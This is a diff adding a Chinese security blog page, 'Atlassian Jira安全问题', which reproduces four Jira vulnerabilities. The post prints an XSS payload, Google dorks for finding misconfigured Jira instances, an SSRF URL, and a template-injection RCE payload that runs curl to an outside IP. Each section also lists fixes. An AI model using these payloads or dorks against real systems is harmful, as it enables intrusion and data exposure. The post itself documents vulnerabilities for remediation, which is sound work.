@@ -1,0 +1,977 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="Atlassian主要有5款产品，分别面向不同的市场。 JIRA（项目、任务管理软件，2002年上线）、Confluence（企业知识管理与协同软件，2004年上线）、BitBucket（代码库，2010年上线）、HipChat（内部聊天/协作软件，2012年上线）以及JIRA Service Desk（服务台软件，2013年上线）。 JIRA被业界公认为最好的项目管理和敏捷开发管理工具Conf">
+<meta name="keywords" content="漏洞复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Atlassian Jira安全问题">
+<meta property="og:url" content="https://wh0ale.github.io/2019/08/26/Atlassian-Jira安全问题/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="Atlassian主要有5款产品，分别面向不同的市场。 JIRA（项目、任务管理软件，2002年上线）、Confluence（企业知识管理与协同软件，2004年上线）、BitBucket（代码库，2010年上线）、HipChat（内部聊天/协作软件，2012年上线）以及JIRA Service Desk（服务台软件，2013年上线）。 JIRA被业界公认为最好的项目管理和敏捷开发管理工具Conf">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-26_13-57-11.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-25_19-26-52.png">
+<meta property="og:updated_time" content="2019-09-25T11:30:46.369Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Atlassian Jira安全问题">
+<meta name="twitter:description" content="Atlassian主要有5款产品，分别面向不同的市场。 JIRA（项目、任务管理软件，2002年上线）、Confluence（企业知识管理与协同软件，2004年上线）、BitBucket（代码库，2010年上线）、HipChat（内部聊天/协作软件，2012年上线）以及JIRA Service Desk（服务台软件，2013年上线）。 JIRA被业界公认为最好的项目管理和敏捷开发管理工具Conf">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-26_13-57-11.png">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/08/26/Atlassian-Jira安全问题/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Atlassian Jira安全问题 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/08/26/Atlassian-Jira安全问题/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">Atlassian Jira安全问题
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-08-26 13:43:55" itemprop="dateCreated datePublished" datetime="2019-08-26T13:43:55+08:00">2019-08-26</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-25 19:30:46" itemprop="dateModified" datetime="2019-09-25T19:30:46+08:00">2019-09-25</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">3.5k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">3 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <blockquote>
+<p>Atlassian主要有5款产品，分别面向不同的市场。</p>
+<p>JIRA（项目、任务管理软件，2002年上线）、Confluence（企业知识管理与协同软件，2004年上线）、BitBucket（代码库，2010年上线）、HipChat（内部聊天/协作软件，2012年上线）以及JIRA Service Desk（服务台软件，2013年上线）。</p>
+<p>JIRA被业界公认为最好的项目管理和敏捷开发管理工具<br>Confluence被认为是最好用的企业级Wiki和知识管理工具</p>
+<p>Jira中文介绍：<br><a href="https://confluence.atlassian.com/pages/viewpage.action?pageId=933888022" target="_blank" rel="noopener">https://confluence.atlassian.com/pages/viewpage.action?pageId=933888022</a><br>Jira各插件说明：<br><a href="http://confluence.gjingao.com/pages/viewpage.action?pageId=3670502" target="_blank" rel="noopener">http://confluence.gjingao.com/pages/viewpage.action?pageId=3670502</a><br>Jira优秀插件：<br><a href="http://confluence.gjingao.com/pages/viewpage.action?pageId=328170" target="_blank" rel="noopener">http://confluence.gjingao.com/pages/viewpage.action?pageId=328170</a></p>
+<p>Confluence中文介绍：<br><a href="http://confluence.gjingao.com/pages/viewpage.action?pageId=327854" target="_blank" rel="noopener">http://confluence.gjingao.com/pages/viewpage.action?pageId=327854</a></p>
+<p>Atlassion其他产品介绍：<br><a href="http://confluence.gjingao.com/pages/viewpage.action?pageId=6520898" target="_blank" rel="noopener">http://confluence.gjingao.com/pages/viewpage.action?pageId=6520898</a></p>
+</blockquote>
+<h1 id="CVE-2019-3402：-Jira-XSS-in-the-labels-gadget"><a href="#CVE-2019-3402：-Jira-XSS-in-the-labels-gadget" class="headerlink" title="CVE-2019-3402：[Jira]XSS in the labels gadget"></a>CVE-2019-3402：[Jira]XSS in the labels gadget</h1><p><strong>漏洞描述：</strong></p>
+<p><code>Jira 7.13.3</code>之前的Jira中的<code>ConfigurePortalPages.jspa</code>资源和版本<code>8.1.1</code>之前的<code>8.0.0</code>版允许远程攻击者通过<code>searchOwnerUserName</code>参数中的跨站点脚本（XSS）漏洞注入任意HTML或JavaScript。</p>
+<p>ConfigurePortalPages.jspa页面的searchOwnerUserName参数的反射型XSS。</p>
+<p>payload:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://jira.test.com/secure/ConfigurePortalPages!default.jspa?view=search&amp;searchOwnerUserName=test&lt;script&gt;alert(1)&lt;%2Fscript&gt;t1nmk&amp;Search=Search</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-26_13-57-11.png" alt="bytedance"></p>
+<p><strong>修复建议</strong></p>
+<p>1.需要对<code>searchOwnerUserName</code>进行过滤。</p>
+<p>2.升级版本</p>
+<h1 id="Jira的误配置导致的敏感信息泄露"><a href="#Jira的误配置导致的敏感信息泄露" class="headerlink" title="Jira的误配置导致的敏感信息泄露"></a>Jira的误配置导致的敏感信息泄露</h1><p><strong>google dork</strong></p>
+<p>此查询列出了其URI中具有“UserPickerBrowser”的所有URL，以查找公开而且不需要经过身份验证的所有配置错误的 JIRA 用户选择器功能。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:/UserPickerBrowser.jspa -intitle:Login -intitle:Log</span><br></pre></td></tr></table></figure>
+
+<p>此查询列出了所有在其URI中具有“Managefilters”并且文本为“Public”的URL，以便找到所有公开暴露且未经过身份验证的错误配置的JIRA过滤器。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:/ManageFilters.jspa?filterView=popular AND ( intext:All users OR intext:Shared with the public OR intext:Public )</span><br></pre></td></tr></table></figure>
+
+<p>此查询列出其URI中具有“ConfigurePortalPages”的所有URL，以查找公开公开的所有JIRA仪表板。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:/ConfigurePortalPages!default.jspa?view=popular</span><br></pre></td></tr></table></figure>
+
+<p>在进一步侦察（信息收集）时，各公司都有“company.atlassian.net”格式的JIRA URL，因此如果您想检查任何配置错误的过滤器，仪表板或用户选择器功能的公司，您需要 只需将他们的名字放在URL中 （可以用来批量）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://companyname.atlassian.net/secure/popups/UserPickerBrowser.jspa</span><br><span class="line">http://companyname.atlassian.net/secure/ManageFilters.jspa?filterView=popular</span><br><span class="line">http://companyname.atlassian.net/secure/ConfigurePortalPages!default.jspa?view=popular</span><br></pre></td></tr></table></figure>
+
+<p><strong>修复建议</strong></p>
+<p>其实就是创建过滤器的时候，指定要可见范围: <code>Any logged-in user</code>。</p>
+<h1 id="CVE-2019-11581-Atlassian-Jira未授权服务端模板注入漏洞"><a href="#CVE-2019-11581-Atlassian-Jira未授权服务端模板注入漏洞" class="headerlink" title="CVE-2019-11581 Atlassian Jira未授权服务端模板注入漏洞"></a>CVE-2019-11581 Atlassian Jira未授权服务端模板注入漏洞</h1><p><strong>影响版本</strong></p>
+<ul>
+<li>4.4.x</li>
+<li>5.x.x</li>
+<li>6.x.x</li>
+<li>7.0.x</li>
+<li>7.1.x</li>
+<li>7.2.x</li>
+<li>7.3.x</li>
+<li>7.4.x</li>
+<li>7.5.x</li>
+<li>7.6.x &lt; 7.6.14</li>
+<li>7.7.x</li>
+<li>7.8.x</li>
+<li>7.9.x</li>
+<li>7.10.x</li>
+<li>7.11.x</li>
+<li>7.12.x</li>
+<li>7.13.x &lt; 7.13.5</li>
+<li>8.0.x &lt; 8.0.3</li>
+<li>8.1.x &lt; 8.1.2</li>
+<li>8.2.x &lt; 8.2.3</li>
+</ul>
+<p><strong>修复版本</strong></p>
+<ul>
+<li>7.6.14</li>
+<li>7.13.5</li>
+<li>8.0.3</li>
+<li>8.1.2</li>
+<li>8.2.3</li>
+</ul>
+<p><strong>漏洞复现</strong></p>
+<p>复现条件：</p>
+<p>1.开启 - 前台 - 联系网站管理员</p>
+<p>2.需要有账户登陆</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$i18n.getClass().forName(&apos;java.lang.Runtime&apos;).getMethod(&apos;getRuntime&apos;,null).invoke(null,null).exec(&apos;curl 118.25.**.**:8000//jas502n//&apos;).waitFor()</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://github.com/jas502n/CVE-2019-11581" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-11581</a></p>
+<p><strong>修复建议</strong></p>
+<p>1.升级到修复版本（7.6.14、7.13.5、8.0.3、8.1.2、8.2.3）。</p>
+<p>2.禁用”联系网站管理员“功能。设置=&gt; 系统=&gt; 编辑设置=&gt; 联系管理员表单处选择“关”，然后点击最下面的“更新”保存设置。具体操作方式参考：<a href="https://confluence.atlassian.com/adminjiraserver/configuring-the-administrator-contact-form-974375905.html#Configuringtheadministratorcontactform-DisablingtheContactAdministratorsForm" target="_blank" rel="noopener">https://confluence.atlassian.com/adminjiraserver/configuring-the-administrator-contact-form-974375905.html#Configuringtheadministratorcontactform-DisablingtheContactAdministratorsForm</a></p>
+<p>验证生效方法：访问<code>/secure/ContactAdministrators!default.jspa</code> 出现：“您的Jira管理员尚未配置此联系表。”或“Your Jira administrator has not yet configured this contact form”</p>
+<p>3.禁止对<code>/secure/admin/SendBulkMail!default.jspa</code>的访问。</p>
+<h1 id="CVE-2019-8451-CNNVD-201909-556-Jira-Unauthorized-SSRF"><a href="#CVE-2019-8451-CNNVD-201909-556-Jira-Unauthorized-SSRF" class="headerlink" title="CVE-2019-8451/CNNVD-201909-556 Jira Unauthorized SSRF"></a>CVE-2019-8451/CNNVD-201909-556 Jira Unauthorized SSRF</h1><p>Jira 版本8.4.0之前的Jira中的/plugins/servlet/gadgets/ makeRequest 资源允许远程攻击者通过服务器端请求伪造（SSRF）漏洞访问内部网络资源的内容。</p>
+<p><strong>影响版本</strong></p>
+<p>&#39;Version&#39;: &#39;&lt; 8.4.0&#39;</p>
+<p><strong>修复建议</strong></p>
+<p>升级至8.4.0或其以后版本</p>
+<p><strong>漏洞复现</strong></p>
+<blockquote>
+<p>/plugins/servlet/gadgets/makeRequest?url={target}@<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p>
+</blockquote>
+<p>使用payload在未授权的情况下进行SSRF成功访问百度</p>
+<p>影响范围挺广，批量zoomeye测试了下几乎一半都存在该漏洞</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-25_19-26-52.png" alt></p>
+<p>参考：</p>
+<p><a href="https://blog.csdn.net/caiqiiqi/article/details/98481700" target="_blank" rel="noopener">Jira的误配置导致的敏感信息泄露</a></p>
+<p><a href="https://medium.com/@logicbomb_1/one-misconfig-jira-to-leak-them-all-including-nasa-and-hundreds-of-fortune-500-companies-a70957ef03c7" target="_blank" rel="noopener">One Misconfig (JIRA) to Leak Them All- Including NASA and Hundreds of Fortune 500 Companies!</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/08/26/Atlassian-Jira安全问题/" title="Atlassian Jira安全问题">https://wh0ale.github.io/2019/08/26/Atlassian-Jira安全问题/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/漏洞复现/" rel="tag"><i class="fa fa-tag"></i># 漏洞复现</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/08/26/Apache-Solr安全问题/" rel="next" title="Apache Solr安全问题">
+                <i class="fa fa-chevron-left"></i> Apache Solr安全问题
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/08/26/ATT-CK/" rel="prev" title="ATT&CK">
+                ATT&CK <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2019-3402：-Jira-XSS-in-the-labels-gadget"><span class="nav-number">1.</span> <span class="nav-text">CVE-2019-3402：[Jira]XSS in the labels gadget</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Jira的误配置导致的敏感信息泄露"><span class="nav-number">2.</span> <span class="nav-text">Jira的误配置导致的敏感信息泄露</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2019-11581-Atlassian-Jira未授权服务端模板注入漏洞"><span class="nav-number">3.</span> <span class="nav-text">CVE-2019-11581 Atlassian Jira未授权服务端模板注入漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2019-8451-CNNVD-201909-556-Jira-Unauthorized-SSRF"><span class="nav-number">4.</span> <span class="nav-text">CVE-2019-8451/CNNVD-201909-556 Jira Unauthorized SSRF</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
